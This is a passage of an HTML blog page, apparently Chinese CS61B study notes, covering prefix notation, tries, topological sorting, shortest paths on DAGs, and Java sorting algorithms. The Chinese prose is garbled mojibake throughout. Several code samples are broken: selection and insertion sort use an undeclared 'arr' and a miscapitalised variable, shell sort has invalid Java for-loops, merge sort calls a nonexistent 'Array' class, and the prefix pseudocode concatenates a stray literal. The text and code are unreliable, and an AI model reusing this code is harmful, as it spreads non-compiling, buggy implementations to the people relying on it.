3â€åœ¨å‰ç¼€è¡¨ç¤ºæ³•ä¸­å°†å†™ä¸ºâ€œ+ 2 3â€ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œâ€œ+â€æ˜¯è¿ç®—ç¬¦ï¼Œè€Œâ€œ2â€å’Œâ€œ3â€æ˜¯æ“ä½œæ•°ã€‚</p><p>å‰ç¼€è¡¨ç¤ºæ³•å…·æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼š</p><ol><li>æ— éœ€æ‹¬å·ï¼šç”±äºè¿ç®—ç¬¦ä½äºæ“ä½œæ•°ä¹‹å‰ï¼Œä¸éœ€è¦ä½¿ç”¨æ‹¬å·æ¥è¡¨ç¤ºä¼˜å…ˆçº§ã€‚</li><li>æ˜“äºè®¡ç®—ï¼šè®¡ç®—æœºåœ¨å¤„ç†å‰ç¼€è¡¨ç¤ºæ³•æ—¶é€šå¸¸ä½¿ç”¨æ ˆæ¥è¿›è¡Œè®¡ç®—ï¼Œè¿™ä½¿å¾—è®¡ç®—è¿‡ç¨‹æ›´åŠ ç®€æ´å’Œé«˜æ•ˆã€‚</li><li>æ˜“äºè½¬æ¢ï¼šå‰ç¼€è¡¨ç¤ºæ³•å¯ä»¥å¾ˆå®¹æ˜“åœ°è½¬æ¢ä¸ºåç¼€è¡¨ç¤ºæ³•æˆ–ä¸­ç¼€è¡¨ç¤ºæ³•ï¼Œä»è€Œä¾¿äºäººä»¬é˜…è¯»å’Œç†è§£ã€‚</li></ol><p>å¯¹äºå‰ç¼€æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Tireæ ‘è¿›è¡Œç›¸å…³æ“ä½œã€‚</p><h2 id="Tire-Tree"><a href="#Tire-Tree" class="headerlink" title="Tire Tree"></a>Tire Tree</h2><p>Trieæ ‘ï¼ˆä¹Ÿç§°ä¸ºå‰ç¼€æ ‘æˆ–å­—å…¸æ ‘ï¼‰æ˜¯ä¸€ç§æ ‘å½¢æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨åŠ¨æ€é›†åˆï¼Œå…¶ä¸­é”®é€šå¸¸æ˜¯å­—ç¬¦ä¸²ã€‚Trieæ ‘çš„åç§°æ¥æºäºâ€retrievalâ€ï¼Œè¡¨æ˜å…¶ä¸»è¦ç”¨é€”æ˜¯æ”¯æŒå¿«é€Ÿçš„æ£€ç´¢æ“ä½œã€‚</p><p>åœ¨Trieæ ‘ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œé€šå¸¸ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œåˆ°è¾¾æ¯ä¸ªèŠ‚ç‚¹çš„è·¯å¾„è¡¨ç¤ºä»æ ¹åˆ°è¯¥èŠ‚ç‚¹çš„å­—ç¬¦åºåˆ—ã€‚å¶èŠ‚ç‚¹é€šå¸¸è¡¨ç¤ºä¸€ä¸ªå®Œæ•´çš„å•è¯ï¼Œä½†ä¹Ÿå¯èƒ½åªæ˜¯ä¸€ä¸ªå‰ç¼€ã€‚</p><p>ä¸€ä¸ªç®€å•å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrieSet</span> &#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">R</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>; <span class="hljs-comment">// ASCII</span><br>   <span class="hljs-keyword">private</span> Node root;    <span class="hljs-comment">// root of trie</span><br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br>      <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isKey;   <br>      <span class="hljs-keyword">private</span> DataIndexedCharMap next;<br><br>      <span class="hljs-keyword">private</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(<span class="hljs-type">boolean</span> blue, <span class="hljs-type">int</span> R)</span> &#123;<br>         isKey = blue;<br>         next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataIndexedCharMap</span>&lt;Node&gt;(R);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºäº†è®©Tireèƒ½å¤Ÿé«˜æ•ˆåœ°è¿›è¡Œå‰ç¼€åŒ¹é…æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€äº›æ–¹æ³•ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬è€ƒè™‘å®šä¹‰ä¸€ä¸ª <em>collect</em> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥ç”¨äºè¿”å›Tireä¸­çš„æ‰€æœ‰é”®ã€‚<br>ä¼ªä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">collect():<br>    Create an empty <span class="hljs-built_in">list</span> of results x<br>    For character c <span class="hljs-keyword">in</span> root.<span class="hljs-built_in">next</span>.keys():<br>        Call colHelp(c, x, root.<span class="hljs-built_in">next</span>.get(c))<br>    Return x<br><br>colHelp(String s, <span class="hljs-type">List</span>&lt;String&gt; x, Node n):<br>    <span class="hljs-keyword">if</span> n.isKey:<br>        x.add(s)<br>    For character c <span class="hljs-keyword">in</span> n.<span class="hljs-built_in">next</span>.keys():<br>        Call colHelp(s + c, x, n.<span class="hljs-built_in">next</span>.get(c))<br></code></pre></td></tr></table></figure><p>åŸºäº <em>collect</em> æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ <em>keyWithPrefix</em> æ–¹æ³•ï¼Œè¿”å›å…·æœ‰ç‰¹å®šå‰ç¼€çš„æ‰€æœ‰é”®ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">keysWithPrefix(String s):<br>    Find the end of the prefix, alpha<br>    Create an empty <span class="hljs-built_in">list</span> x<br>    For character <span class="hljs-keyword">in</span> alpha.<span class="hljs-built_in">next</span>.keys():<br>        Call colHelp(<span class="hljs-string">&quot;sa&quot;</span> + c, x, alpha.<span class="hljs-built_in">next</span>.get(c))<br>    Return x<br></code></pre></td></tr></table></figure><h1 id="DAG-and-Topological-Sorting"><a href="#DAG-and-Topological-Sorting" class="headerlink" title="DAG and Topological Sorting"></a>DAG and Topological Sorting</h1><p>æ‹“æ‰‘æ’åºï¼ˆTopological Sortingï¼‰æ˜¯ä¸€ç§ç”¨äºæœ‰å‘å›¾çš„æ’åºç®—æ³•ï¼Œå®ƒèƒ½å¤Ÿå°†å›¾ä¸­çš„èŠ‚ç‚¹æŒ‰ç…§å®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»è¿›è¡Œæ’åºï¼Œä½¿å¾—æ‰€æœ‰çš„ä¾èµ–å…³ç³»éƒ½å¾—åˆ°æ»¡è¶³ã€‚</p><p>åœ¨æ‹“æ‰‘æ’åºä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€æ¡ä»èŠ‚ç‚¹ A åˆ°èŠ‚ç‚¹ B çš„è·¯å¾„ï¼Œé‚£ä¹ˆåœ¨æ’åºç»“æœä¸­èŠ‚ç‚¹ A å°†ä½äºèŠ‚ç‚¹ B ä¹‹å‰ã€‚æ¢å¥è¯è¯´ï¼Œæ‰€æœ‰çš„ä¾èµ–å…³ç³»éƒ½æ˜¯ä»å·¦åˆ°å³çš„ã€‚</p><p>æ‹“æ‰‘æ’åºé€šå¸¸åº”ç”¨äºæœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰ï¼Œå› ä¸ºæœ‰å‘æ— ç¯å›¾æ˜¯ä¸€ç§æ²¡æœ‰å¾ªç¯ä¾èµ–çš„å›¾ï¼Œå¯ä»¥é€šè¿‡æ‹“æ‰‘æ’åºè¿›è¡Œæœ‰æ•ˆçš„æ’åºã€‚</p><p><img src="/Pictures/CS61b/02/DAG.png" alt="DAG"></p><p>å¯¹äºä¸Šå›¾ä¸­çš„DAGï¼Œæˆ‘ä»¬æœ‰è¿™æ ·çš„ä¸€äº›æœ‰æ•ˆçš„æ‹“æ‰‘æ’åºï¼š</p><ol><li>$[D, B, A, E, C, F]$</li><li>$[E, D, C, B, A, F]$</li></ol><p>å¯¹äºä»»ä½•æ‹“æ‰‘æ’åºï¼Œæˆ‘ä»¬éƒ½å¯ä»¥é‡ç»˜å›¾å½¢ä½¿æ¯ä¸ªé¡¶ç‚¹éƒ½ä½äºä¸€æ¡ç›´çº¿ä¸Šï¼Œè¿™ç§°ä¸ºå›¾çš„çº¿æ€§åŒ–ã€‚</p><p><img src="/Pictures/CS61b/02/Linear.png" alt="DAG"></p><h2 id="Topological-Sort-Algorithm"><a href="#Topological-Sort-Algorithm" class="headerlink" title="Topological Sort Algorithm"></a>Topological Sort Algorithm</h2><p>æˆ‘ä»¬ä¸€èˆ¬åˆ©ç”¨DFSï¼ˆæ·±åº¦ä¼˜å…ˆæœç´¢ï¼‰æ¥å®ç°å¯¹DAGçš„æ‹“æ‰‘æ’åºã€‚</p><ol><li>å¯¹äºæœ‰å‘å›¾ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œåˆå§‹åŒ–ä¸€ä¸ªæ ‡è®°æ•°ç»„ï¼Œç”¨äºæ ‡è®°èŠ‚ç‚¹æ˜¯å¦è¢«è®¿é—®è¿‡ï¼Œä»¥åŠä¸€ä¸ªæ ˆæˆ–è€…åˆ—è¡¨ç”¨äºå­˜å‚¨æ’åºç»“æœã€‚</li><li>ä»å›¾ä¸­ä»»æ„æœªè¢«è®¿é—®çš„èŠ‚ç‚¹å¼€å§‹ï¼Œå¯¹æ¯ä¸ªæœªè¢«è®¿é—®çš„èŠ‚ç‚¹æ‰§è¡Œæ­¥éª¤ 3ã€‚</li><li>å¯¹äºå½“å‰èŠ‚ç‚¹ï¼Œè¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼š<ul><li>å°†å½“å‰èŠ‚ç‚¹æ ‡è®°ä¸ºå·²è®¿é—®ã€‚</li><li>å¯¹å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰é‚»å±…èŠ‚ç‚¹ï¼ˆå³å½“å‰èŠ‚ç‚¹æŒ‡å‘çš„èŠ‚ç‚¹ï¼‰è¿›è¡Œé€’å½’è°ƒç”¨æ­¥éª¤ 3ã€‚</li><li>å°†å½“å‰èŠ‚ç‚¹å‹å…¥æ ˆæˆ–è€…æ·»åŠ åˆ°åˆ—è¡¨ä¸­ã€‚</li></ul></li><li>å½“å¯¹å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰é‚»å±…èŠ‚ç‚¹éƒ½å®Œæˆäº†æ·±åº¦ä¼˜å…ˆæœç´¢åï¼Œè¿”å›åˆ°æ­¥éª¤ 2ï¼Œé€‰æ‹©å¦ä¸€ä¸ªæœªè¢«è®¿é—®çš„èŠ‚ç‚¹è¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ã€‚</li><li>å½“æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«è®¿é—®å¹¶å®Œæˆæ·±åº¦ä¼˜å…ˆæœç´¢åï¼Œæ ˆæˆ–åˆ—è¡¨ä¸­çš„é¡ºåºå°±æ˜¯æ‹“æ‰‘æ’åºçš„ç»“æœã€‚</li></ol><p>åˆ©ç”¨pythonå®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">topological_sort</span>(<span class="hljs-params">graph</span>):<br>    visited = <span class="hljs-built_in">set</span>()<br>    stack = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">node</span>):<br>        visited.add(node)<br>        <span class="hljs-keyword">for</span> neighbor <span class="hljs-keyword">in</span> graph.get(node, []):<br>            <span class="hljs-keyword">if</span> neighbor <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                dfs(neighbor)<br>        stack.append(node)<br><br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> graph:<br>        <span class="hljs-keyword">if</span> node <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>            dfs(node)<br><br>    <span class="hljs-keyword">return</span> stack[::-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h2 id="Shortest-Paths-on-DAGs"><a href="#Shortest-Paths-on-DAGs" class="headerlink" title="Shortest Paths on DAGs"></a>Shortest Paths on DAGs</h2><p>Dijkstraç®—æ³•å¯ä»¥è®¡ç®—æœ€çŸ­è·¯å¾„ï¼Œä½†æ˜¯åœ¨è¾¹çš„æƒé‡ä¸ºè´Ÿå€¼æ—¶ï¼Œç®—æ³•æ— æ³•ä¿è¯æœ‰æ•ˆæ€§ã€‚</p><p>æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨æ‹“æ‰‘æ’åºåŠ åŠ¨æ€è§„åˆ’çš„æ€æƒ³ï¼Œå¯¹Dijkstraç®—æ³•è¿›è¡Œè¡¥å…¨ã€‚</p><p>ä¸‹é¢ç»™å‡ºä¸€ä¸ªå¯èƒ½çš„æ­¥éª¤ï¼š</p><ol><li>å¯¹ DAG è¿›è¡Œæ‹“æ‰‘æ’åºï¼Œå¾—åˆ°èŠ‚ç‚¹çš„æ‹“æ‰‘æ’åºé¡ºåºã€‚</li><li>åˆå§‹åŒ–ä¸€ä¸ªè·ç¦»æ•°ç»„ï¼Œç”¨äºå­˜å‚¨ä»èµ·å§‹èŠ‚ç‚¹åˆ°æ¯ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·ç¦»ã€‚å°†èµ·å§‹èŠ‚ç‚¹çš„è·ç¦»è®¾ä¸º 0ï¼Œå…¶ä»–èŠ‚ç‚¹çš„è·ç¦»è®¾ä¸ºæ­£æ— ç©·å¤§ã€‚</li><li>æŒ‰ç…§æ‹“æ‰‘æ’åºçš„é¡ºåºä¾æ¬¡å¤„ç†æ¯ä¸ªèŠ‚ç‚¹ï¼š<ul><li>å¯¹äºå½“å‰èŠ‚ç‚¹ uï¼Œéå†å…¶æ‰€æœ‰çš„é‚»å±…èŠ‚ç‚¹ vã€‚</li><li>å¯¹äºæ¯ä¸ªé‚»å±…èŠ‚ç‚¹ vï¼Œæ›´æ–°å…¶è·ç¦»ä¸º min(å½“å‰è·ç¦»[v], å½“å‰è·ç¦»[u] + è¾¹(u, v)çš„æƒé‡)ã€‚</li></ul></li><li>æœ€ç»ˆï¼Œè·ç¦»æ•°ç»„ä¸­å­˜å‚¨çš„å°±æ˜¯ä»èµ·å§‹èŠ‚ç‚¹åˆ°æ¯ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„é•¿åº¦ã€‚</li></ol><h1 id="Sorts"><a href="#Sorts" class="headerlink" title="Sorts"></a>Sorts</h1><p>åœ¨æœ€åï¼Œæˆ‘ä»¬äº†è§£å¹¶å®è·µä¸€äº›å¸¸è§çš„æ’åºç®—æ³•ã€‚</p><p><img src="/Pictures/CS61b/02/sort.png" alt="sort"></p><h2 id="Bubble-Sort"><a href="#Bubble-Sort" class="headerlink" title="Bubble Sort"></a>Bubble Sort</h2><p>å†’æ³¡æ’åºï¼ˆBubble Sortï¼‰ä¹Ÿæ˜¯ä¸€ç§ç®€å•ç›´è§‚çš„æ’åºç®—æ³•ã€‚å®ƒé‡å¤åœ°èµ°è®¿è¿‡è¦æ’åºçš„æ•°åˆ—ï¼Œä¸€æ¬¡æ¯”è¾ƒä¸¤ä¸ªå…ƒç´ ï¼Œå¦‚æœä»–ä»¬çš„é¡ºåºé”™è¯¯å°±æŠŠä»–ä»¬äº¤æ¢è¿‡æ¥ã€‚èµ°è®¿æ•°åˆ—çš„å·¥ä½œæ˜¯é‡å¤åœ°è¿›è¡Œç›´åˆ°æ²¡æœ‰å†éœ€è¦äº¤æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥æ•°åˆ—å·²ç»æ’åºå®Œæˆã€‚è¿™ä¸ªç®—æ³•çš„åå­—ç”±æ¥æ˜¯å› ä¸ºè¶Šå°çš„å…ƒç´ ä¼šç»ç”±äº¤æ¢æ…¢æ…¢â€æµ®â€åˆ°æ•°åˆ—çš„é¡¶ç«¯ã€‚</p><p><img src="/Pictures/CS61b/02/bubbleSort.gif" alt="bubbleSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; nums.length - i - <span class="hljs-number">1</span>; j++) &#123;<br>                <span class="hljs-type">int</span> temp;<br>                <span class="hljs-keyword">if</span>(nums[j] &gt; nums[j+<span class="hljs-number">1</span>]) &#123;<br>                    temp = nums[j];<br>                    nums[j] = nums[j+<span class="hljs-number">1</span>];<br>                    nums[j+<span class="hljs-number">1</span>] = temp;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Select-Sort"><a href="#Select-Sort" class="headerlink" title="Select Sort"></a>Select Sort</h2><p>é€‰æ‹©æ’åºçš„åŸºæœ¬æ€æƒ³ï¼šé¦–å…ˆåœ¨æœªæ’åºåºåˆ—ä¸­æ‰¾åˆ°æœ€å°ï¼ˆå¤§ï¼‰å…ƒç´ ï¼Œå­˜æ”¾åˆ°æ’åºåºåˆ—çš„èµ·å§‹ä½ç½®ã€‚</p><p>å†ä»å‰©ä½™æœªæ’åºå…ƒç´ ä¸­ç»§ç»­å¯»æ‰¾æœ€å°ï¼ˆå¤§ï¼‰å…ƒç´ ï¼Œç„¶åæ”¾åˆ°å·²æ’åºåºåˆ—çš„æœ«å°¾ã€‚</p><p>é‡å¤ç¬¬äºŒæ­¥ï¼Œç›´åˆ°æ‰€æœ‰å…ƒç´ å‡æ’åºå®Œæ¯•ã€‚</p><p><img src="/Pictures/CS61b/02/selectionSort.gif" alt="selectSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">selectSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-type">int</span> minIndex, temp;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            minIndex = i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; len; j++) &#123;<br>                <span class="hljs-keyword">if</span>(nums[j] &lt; nums[minIndex]) &#123;<br>                    minIndex = j;<br>                &#125;<br>            &#125;<br>            temp = arr[i];<br>            arr[i] = arr[minIndex];<br>            arr[minIndex] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Insert-Sort"><a href="#Insert-Sort" class="headerlink" title="Insert Sort"></a>Insert Sort</h2><p>æ’å…¥æ’åºæ˜¯ä¸€ç§æœ€ç®€å•ç›´è§‚çš„æ’åºç®—æ³•ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯é€šè¿‡æ„å»ºæœ‰åºåºåˆ—ï¼Œå¯¹äºæœªæ’åºæ•°æ®ï¼Œåœ¨å·²æ’åºåºåˆ—ä¸­ä»åå‘å‰æ‰«æï¼Œæ‰¾åˆ°ç›¸åº”ä½ç½®å¹¶æ’å…¥ã€‚</p><p><img src="/Pictures/CS61b/02/insertSort.gif" alt="insertSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-type">int</span> preIndex, current;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; len; i++) &#123;<br>            preIndex = i - <span class="hljs-number">1</span>;<br>            current = nums[i];<br>            <span class="hljs-keyword">while</span>(preIndex &gt;= <span class="hljs-number">0</span> &amp;&amp; nums[preIndex] &gt; current) &#123;<br>                nums[PreIndex + <span class="hljs-number">1</span>] = nums[preIndex];<br>                preIndex--;<br>            &#125;<br>            arr[preIndex + <span class="hljs-number">1</span>] = current;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Shell-Sort"><a href="#Shell-Sort" class="headerlink" title="Shell Sort"></a>Shell Sort</h2><p>å¸Œå°”æ’åºçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šå…ˆå°†æ•´ä¸ªå¾…æ’åºçš„è®°å½•åºåˆ—åˆ†å‰²æˆä¸ºè‹¥å¹²å­åºåˆ—åˆ†åˆ«è¿›è¡Œç›´æ¥æ’å…¥æ’åºï¼Œå¾…æ•´ä¸ªåºåˆ—ä¸­çš„è®°å½•â€åŸºæœ¬æœ‰åºâ€æ—¶ï¼Œå†å¯¹å…¨ä½“è®°å½•è¿›è¡Œä¾æ¬¡ç›´æ¥æ’å…¥æ’åºã€‚</p><p><img src="/Pictures/CS61b/02/shellSort.gif" alt="shellSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shellSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-type">int</span> temp, gap = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(gap &lt; len/<span class="hljs-number">3</span>) &#123;<br>            gap = gap*<span class="hljs-number">3</span>+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(gap; gap &gt;<span class="hljs-number">0</span>; gap = gap/<span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> gap; i &lt; len; i++) &#123;<br>                temp = nums[i];<br>                <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i - gap;<br>                <span class="hljs-keyword">for</span>(j; j &gt;=<span class="hljs-number">0</span> &amp;&amp; nums[j] &gt; temp; j -= gap) &#123;<br>                    nums[j+gap] = nums[j];<br>                &#125;<br>                nums[j+gap] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Merge-Sort"><a href="#Merge-Sort" class="headerlink" title="Merge Sort"></a>Merge Sort</h2><p>å½’å¹¶æ’åºï¼ˆMerge sortï¼‰æ˜¯å»ºç«‹åœ¨å½’å¹¶æ“ä½œä¸Šçš„ä¸€ç§æœ‰æ•ˆçš„æ’åºç®—æ³•ã€‚è¯¥ç®—æ³•æ˜¯é‡‡ç”¨åˆ†æ²»æ³•ï¼ˆDivide and Conquerï¼‰çš„ä¸€ä¸ªéå¸¸å…¸å‹çš„åº”ç”¨ã€‚</p><p><img src="/Pictures/CS61b/02/mergeSort.gif" alt="mergeSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] sort(<span class="hljs-type">int</span>[] nums) &#123;<br>        <span class="hljs-keyword">if</span>(nums.length &lt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> nums;<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> nums.length / <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[] left = Array.copyOfRange(nums, <span class="hljs-number">0</span>, mid);<br>        <span class="hljs-type">int</span>[] right = Array.copyOfRange(nums, mid, nums.length);<br>        <span class="hljs-keyword">return</span> merge(sort(left), sort(right));<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] merge(<span class="hljs-type">int</span>[] left, <span class="hljs-type">int</span>[] right) &#123;<br>        <span class="hljs-type">int</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[left.length + right.length];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (left.length &gt; <span class="hljs-number">0</span> &amp;&amp; right.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span 